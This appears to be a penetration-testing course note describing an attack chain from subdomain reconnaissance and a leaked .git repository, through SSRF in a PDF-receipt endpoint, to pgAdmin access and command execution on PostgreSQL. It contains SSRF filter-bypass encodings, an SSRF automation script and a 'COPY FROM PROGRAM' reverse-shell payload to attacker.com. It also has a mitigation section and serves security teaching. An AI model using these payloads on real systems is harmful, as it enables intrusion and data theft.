---
tags: [chaining, advanced, real-world, vapt]
difficulty: expert
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.11 Chain Recon to DB Admin"
---

# Advanced Chaining: Reconnaissance to Database Administrator

## Introduction

In modern penetration testing and red teaming, finding a single critical vulnerability (like an unauthenticated Remote Code Execution flaw) is becoming increasingly rare due to the maturity of frameworks, the widespread adoption of Web Application Firewalls (WAFs), and proactive automated scanning. Instead, the most devastating compromises in contemporary architectures are achieved through **Vulnerability Chaining**. 

Chaining involves stringing together multiple low-to-medium severity vulnerabilities to achieve a high-severity impact. The scenario detailed in this document outlines a highly realistic, advanced attack path: beginning with expansive, passive reconnaissance, discovering an exposed secondary asset, leaking source code to find an internal API, exploiting a Server-Side Request Forgery (SSRF) flaw, and ultimately pivoting through the internal network to gain full administrative access to a backend database system.

This chain demonstrates the profound risk of "perimeter erosion"—where the boundary between the internal and external network is blurred by misconfigured microservices and API gateways.

---

## The Attack Kill-Chain Architecture

The following ASCII diagram illustrates the progression of the attack from external reconnaissance to internal network pivoting and database compromise.

```text
+---------------------+
|    Attacker Base    |
| (Internet / OSINT)  |
+---------+-----------+
          | 1. Passive Recon & DNS Enum
          v
+---------------------+       2. Discover Staging     +--------------------------+
|  Public Web Server  |  ---------------------------> | staging.corp.target.com  |
| (corp.target.com)   |       (Forgotten Asset)       | (Exposed .git directory) |
+---------------------+                               +------------+-------------+
                                                                   | 3. Source Code Leak
                                                                   v
                                                      +--------------------------+
                                                      |   Leaked Source Code     |
                                                      | (Contains API Endpoints) |
                                                      +------------+-------------+
                                                                   | 4. Discover SSRF
          +--------------------------------------------------------+
          |
          v 5. SSRF Payload Sent
+---------------------+
|  Main API Gateway   | (api.corp.target.com)
| (Vulnerable SSRF)   |
+---------+-----------+
          | 6. Internal Network Request via SSRF
          | (Targeting 10.0.X.X Subnet)
          v
+---------------------+
| Internal DB Admin   | (e.g., pgAdmin, phpMyAdmin)
| (10.0.5.50:8080)    |
+---------+-----------+
          | 7. Default Credentials / Auth Bypass
          v
+---------------------+
| Backend Database    | (PostgreSQL / MySQL)
| (DB Administrator)  |
+---------------------+
          | 8. RCE / Data Exfiltration
          v
  [ FULL COMPROMISE ]
```

---

## Phase 1: Expansive Reconnaissance

The foundation of any advanced attack is meticulous reconnaissance. Attackers do not attack the heavily fortified main application (`www.target.com`); instead, they map the entire organizational footprint to find forgotten, unmaintained, or legacy assets.

### 1.1 ASN and IP Space Mapping
The first step is identifying the Autonomous System Numbers (ASNs) owned by the target organization using tools like `whois`, `bgp.he.net`, or `amass`.

```bash
# Using Amass to find ASNs and initial IP ranges
amass intel -org "Target Corporation"
```

Once the IP ranges are identified, active scanning is performed using `masscan` or `nmap` to identify exposed services across all ports, not just standard web ports (80/443).

### 1.2 Comprehensive Subdomain Enumeration
Subdomain enumeration is critical for finding staging, development, and testing environments. Attackers combine passive sources (Certificate Transparency logs, DNSdumpster, VirusTotal) with active brute-forcing (using customized wordlists).

```bash
# Combining passive and active subdomain enumeration
subfinder -d target.com -all -recursive -o subdomains_passive.txt
ffuf -w subdomains-top1million-110000.txt -u http://FUZZ.target.com -mc 200,301,302,403
```

**Discovery:** During this phase, the attacker discovers `staging-api-v2.target.com`. Staging environments are notoriously insecure, often containing debug modes, disabled WAFs, and relaxed authentication.

---

## Phase 2: Source Code Disclosure

Upon accessing `staging-api-v2.target.com`, the attacker runs a directory brute-force scan. The scanner identifies an exposed `.git` directory.

### 2.1 Exploiting Exposed .git
When developers deploy applications by simply cloning a repository into the web root, the `.git` directory becomes accessible. This directory contains the entire version history and source code of the application.

The attacker uses tools like `GitTools` or `git-dumper` to reconstruct the repository locally.

```bash
# Dumping the exposed .git repository
./git-dumper.py http://staging-api-v2.target.com/.git/ ./target-staging-repo
```

Once downloaded, the attacker runs `git log` and `git checkout` to restore the working tree. 

### 2.2 Static Analysis and Secret Extraction
With the source code in hand, the attacker performs Static Application Security Testing (SAST) and manual code review. They use tools like `trufflehog` or `grep` to hunt for hardcoded secrets, API keys, and internal IP addresses.

```bash
# Searching for API endpoints and internal references
grep -Rn "http://" ./target-staging-repo
grep -Rn "api/" ./target-staging-repo
```

**Discovery:** The attacker discovers a vulnerable endpoint in the source code meant for generating PDF receipts. The endpoint takes a URL as a parameter, fetches its content, and converts it to a PDF.

```javascript
// Vulnerable Node.js / Express code snippet found in the repo
app.post('/api/v2/generate-receipt', async (req, res) => {
    const receiptUrl = req.body.url;
    // VULNERABILITY: No validation on the 'url' parameter
    const response = await axios.get(receiptUrl); 
    const pdf = generatePdfFromHtml(response.data);
    res.send(pdf);
});
```

---

## Phase 3: Exploiting Server-Side Request Forgery (SSRF)

The `/api/v2/generate-receipt` endpoint is vulnerable to Server-Side Request Forgery (SSRF). Because the server fetches the URL provided by the user without validation, the attacker can force the server to make requests to internal, non-routable IP addresses (e.g., `127.0.0.1`, `10.0.0.0/8`, `169.254.169.254`).

### 3.1 Initial SSRF Verification
The attacker tests the SSRF by pointing it to a Burp Collaborator or a controlled VPS to confirm the server is making outbound HTTP requests.

```http
POST /api/v2/generate-receipt HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
    "url": "http://attacker-controlled-server.com/ssrf-test"
}
```

If the attacker receives a pingback on their server, the SSRF is confirmed.

### 3.2 Bypassing Potential SSRF Filters
If the application attempts to block internal IPs (e.g., filtering `127.0.0.1` or `localhost`), the attacker employs various evasion techniques:
- **Decimal IP Representation:** `http://2130706433/` (equivalent to 127.0.0.1)
- **Octal IP Representation:** `http://0177.0000.0000.0001/`
- **DNS Rebinding:** Creating a DNS A record (e.g., `ssrf.attacker.com`) that initially points to a benign IP, but resolves to an internal IP (e.g., `10.0.0.1`) upon a subsequent lookup.

---

## Phase 4: Internal Network Discovery via SSRF

With a confirmed SSRF, the attacker uses the vulnerable server as a proxy to map the internal network. This is known as "Blind SSRF Port Scanning" if the response isn't directly returned, or "Full SSRF" if the response body is returned (as in this case, where the PDF contains the rendered HTML of the internal site).

### 4.1 Internal Port Scanning
The attacker enumerates the local machine (`127.0.0.1`) and the internal subnet (e.g., `10.0.5.0/24`) for common administrative ports (8080, 8443, 8081, 9090).

They automate this using Burp Suite Intruder, injecting payloads into the SSRF URL parameter:

```http
POST /api/v2/generate-receipt HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
    "url": "http://10.0.5.§subnet_ip§:8080/"
}
```

**Discovery:** The attacker discovers an internal service running on `10.0.5.50:8080`. By examining the generated PDF (which renders the HTML response), the attacker identifies the application as **pgAdmin**, a popular web-based administration tool for PostgreSQL databases.

---

## Phase 5: Pivoting to Database Administrator

Finding an internal administration panel is a goldmine. Internal tools are frequently deployed with default configurations, lack MFA, and are assumed to be safe from external threats because they reside behind the corporate firewall.

### 5.1 Exploiting the DB Admin Panel
The attacker crafts SSRF requests to interact with the pgAdmin interface. If the interface lacks authentication (a common internal misconfiguration) or uses default credentials (e.g., `admin@admin.com` / `admin`), the attacker can gain full access.

If authentication is required, the attacker might chain a known CVE for that specific version of pgAdmin (identified via the rendered HTML version numbers), or attempt a brute-force attack via SSRF.

Assume the attacker successfully logs in using default credentials via SSRF. Because SSRF is stateless and requires crafting complex HTTP requests (including CSRF tokens and session cookies), the attacker often writes a custom Python script to automate the interaction with pgAdmin through the SSRF endpoint.

### 5.2 Extracting Data and Modifying the Database
Once authenticated to pgAdmin via the SSRF pivot, the attacker can execute arbitrary SQL queries against the backend PostgreSQL database.

```python
# Conceptual snippet of the attacker's automation script
import requests

def execute_sql_via_ssrf(sql_query):
    # The payload wraps the SQL query into the format pgAdmin expects,
    # and sends it through the vulnerable SSRF endpoint.
    pgadmin_payload = craft_pgadmin_request(sql_query)
    
    ssrf_payload = {
        "url": "http://10.0.5.50:8080/sqleditor/query",
        "method": "POST",
        "body": pgadmin_payload
    }
    
    response = requests.post("https://api.target.com/api/v2/generate-receipt", json=ssrf_payload)
    return extract_data_from_pdf(response.content)

# Extracting the master user table
execute_sql_via_ssrf("SELECT username, password_hash FROM users;")
```

### 5.3 Achieving Remote Code Execution (RCE)
Database administration often leads to underlying operating system compromise. In PostgreSQL, a database administrator can achieve RCE by leveraging the `COPY` command to write arbitrary files (like a web shell) or by utilizing the `pg_execute_server_program` functionality (introduced in PostgreSQL 9.3).

```sql
-- SQL payload executed via the SSRF/pgAdmin chain to achieve RCE
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
SELECT * FROM cmd_exec;
```

When this query is executed, the PostgreSQL server initiates a reverse bash shell connecting back to the attacker's infrastructure. The attacker has now escalated from an external unauthenticated user to `root` or `postgres` on the internal database server.

---

## Impact and Business Risk

The impact of this chain is catastrophic:
1. **Confidentiality:** The attacker has full access to the backend database, containing Customer PII, financial records, and application secrets.
2. **Integrity:** The attacker can modify financial records, create backdoor admin accounts, or tamper with application data.
3. **Availability:** The attacker can drop tables, delete the database, or deploy ransomware on the internal network.
4. **Lateral Movement:** The database server can now be used as a beachhead to attack internal Active Directory domain controllers, internal Git repositories, or CI/CD pipelines.

---

## Mitigation and Defense in Depth

To break this chain, defenders must implement security controls at every phase:

1. **Reconnaissance & Asset Management:**
   - Maintain a strict inventory of all internet-facing assets.
   - Decommission forgotten staging environments.
   - Restrict access to staging environments via VPN or Zero Trust Network Access (ZTNA).

2. **Source Code Protection:**
   - Prevent deployment of `.git` directories to web roots. Configure web servers (Nginx/Apache) to deny access to `/\.git`.
   - Implement Secret Scanning in CI/CD pipelines to prevent hardcoded credentials from entering the repository.

3. **SSRF Prevention:**
   - Avoid fetching user-supplied URLs if possible.
   - If required, implement an **allowlist** of permitted domains.
   - Use a dedicated network proxy for outbound requests that strictly filters out internal IP ranges (e.g., blocking `10.0.0.0/8`, `127.0.0.0/8`, `169.254.169.254`).
   - Disable following redirects on the HTTP client (e.g., `axios`) to prevent DNS rebinding or redirect bypasses.

4. **Internal Network Security (Zero Trust):**
   - Do not assume internal networks are safe. Internal applications (like pgAdmin) must require strong authentication (MFA) and be restricted to specific administrative jump hosts.
   - Implement network segmentation. The API gateway should only have network access to the specific services it requires, not the entire internal `/24` subnet.

---

## Chaining Opportunities

This vulnerability chain can be extended further:
- **Cloud Metadata Takeover:** Instead of targeting the internal DB, the SSRF could target the AWS IMDS (`169.254.169.254`) to steal IAM roles, leading to full cloud infrastructure compromise.
- **Active Directory Pivot:** Once RCE is achieved on the PostgreSQL server, the attacker can extract local credentials (e.g., via Mimikatz if on Windows) and begin lateral movement within the Windows Domain.

## Related Notes
- [[12 - Server-Side Request Forgery (SSRF)]]
- [[08 - Open Source Intelligence (OSINT)]]
- [[15 - Cloud Security and IAM Privileges]]
- [[22 - Database Exploitation and Post-Exploitation]]
